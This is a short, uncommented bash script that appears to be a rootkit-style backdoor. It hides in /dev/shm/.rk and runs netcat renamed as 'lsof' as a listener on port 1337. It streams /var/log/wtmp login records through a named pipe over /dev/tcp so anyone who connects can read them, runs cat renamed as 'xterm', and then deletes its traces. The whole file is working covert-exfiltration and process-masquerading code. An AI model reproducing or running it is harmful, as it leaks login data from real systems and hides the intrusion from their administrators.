#!/bin/bash

port=1337
logf=/var/log/wtmp
tail=$(which tail)
nc=$(which nc)
cat=$(which cat)

dir=/dev/shm/.rk

mkdir -p $dir
cd $dir
export PATH=$(/bin/pwd):$PATH

cp $nc lsof
lsof -l -p $port >/dev/null 2>&1 &

mkfifo $dir/data
cp $cat xterm
output=/dev/tcp/$(hostname -I | awk '{print $1}')/$port
xterm <data >$output 2>/dev/null &

cd
tail -f $logf >$dir/data 2>/dev/null &

cd $dir
rm -f lsof xterm data
